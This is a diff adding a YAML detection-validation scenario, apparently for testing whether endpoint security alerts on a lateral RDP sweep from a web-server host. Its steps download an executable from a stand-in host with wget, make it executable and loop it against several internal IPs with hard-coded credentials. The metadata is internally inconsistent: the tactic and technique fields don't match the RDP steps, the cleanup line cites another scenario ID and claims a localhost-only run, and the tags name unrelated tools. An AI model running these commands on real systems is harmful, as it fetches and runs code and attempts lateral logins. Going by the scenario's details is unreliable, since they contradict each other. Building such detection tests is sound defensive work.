@@ -1,0 +1,134 @@
+scenario_id: SIM-EDR-038
+name: Rarely-Active Host Conducts Lateral RDP Sweep
+version: '1.0'
+status: active
+plane: EDR
+detection_types:
+- BIOC
+- XQL
+- IOC
+- ABIOC
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-03
+tc_refs:
+- TC-EDR-03
+- TC-EDR-05
+pov_scenario_id: POV-SC-021
+uc_name: Endpoint Detection & Response
+tc_name: Validate multi-method malware detection (local sandbox, behavioral, static analysis)
+mitre_tactic: TA0011
+mitre_tactic_name: Command and Control
+mitre_technique: T1059.004
+mitre_technique_name: 'Command and Scripting Interpreter: Unix Shell'
+additional_techniques:
+- technique: T1071.001
+  name: 'Application Layer Protocol: Web Protocols'
+- technique: T1059.006
+  name: 'Command and Scripting Interpreter: Python'
+threat_report: Unit42 - Mirai Variant Targets Linux and IoT Devices
+threat_report_url: https://unit42.paloaltonetworks.com/mirai-variant-v3g4/
+execution_identity:
+  default: www-data
+  options:
+  - www-data
+  - node
+  - nobody
+  - root
+push_supported: true
+pull_supported: true
+validation_methodology: Endpoint Signal Injection & Detection Accuracy
+methodology_family: F1
+primary_kpi: MTTD
+threshold:
+  kpi: MTTD
+  op: ≤
+  value: 300
+  unit: seconds
+success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected
+
+  XDR BIOC / XQL detections, and the mean time from signal emit to alert
+
+  creation is within the MTTD budget. Each step''s expected_detections row is
+
+  validated against dataset=xdr_data.
+
+  '
+moat_tier: LEAD
+cgo_anchor:
+  image_name: apache2
+  primary_username: www-data
+external_tools:
+- name: Atomic Red Team
+  source: https://github.com/redcanaryco/atomic-red-team
+  type: script
+  install_inline: false
+  adapter_ref: TOOL-ATOMIC-RED-TEAM
+steps:
+- id: step-01
+  name: Create temporary directory
+  command: mkdir -p /tmp/cortexsim
+  identity: www-data
+  mitre_technique: T1021.001
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Abnormal RDP Connection Behavior
+    ttp_ref: TTP-2026-0200
+    detection_id: bioc-abnormal-rdp-connection-behavior
+- id: step-02
+  name: Download rdesktop binary
+  command: wget -O /tmp/cortexsim/rdesktop.exe https://example.com/rdesktop.exe
+  identity: www-data
+  mitre_technique: T1021.001
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Abnormal RDP Connection Behavior
+    ttp_ref: TTP-2026-0200
+    detection_id: bioc-abnormal-rdp-connection-behavior
+  causality:
+    parent_step: step-01
+    pivot: process_lineage
+- id: step-03
+  name: Set execute permissions
+  command: chmod +x /tmp/cortexsim/rdesktop.exe
+  identity: www-data
+  mitre_technique: T1021.001
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Abnormal RDP Connection Behavior
+    ttp_ref: TTP-2026-0200
+    detection_id: bioc-abnormal-rdp-connection-behavior
+  causality:
+    parent_step: step-02
+    pivot: process_lineage
+- id: step-04
+  name: Initiate RDP sweep to multiple hosts
+  command: for ip in 10.0.1.10 10.0.1.11 10.0.1.12 10.0.1.13 10.0.1.14; do /tmp/cortexsim/rdesktop.exe
+    -u user -p pass $ip -port 3389 & done
+  identity: www-data
+  mitre_technique: T1021.001
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Abnormal RDP Connection Behavior
+    ttp_ref: TTP-2026-0200
+    detection_id: bioc-abnormal-rdp-connection-behavior
+  causality:
+    parent_step: step-03
+    pivot: process_lineage
+cleanup:
+  commands:
+  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
+author: Henry Reed
+created: '2026-04-14'
+last_updated: '2026-04-14'
+tags:
+- reverse-shell
+- command-and-control
+- c2-callback
+- endpoint-security
+- bash
+- python
+- netcat
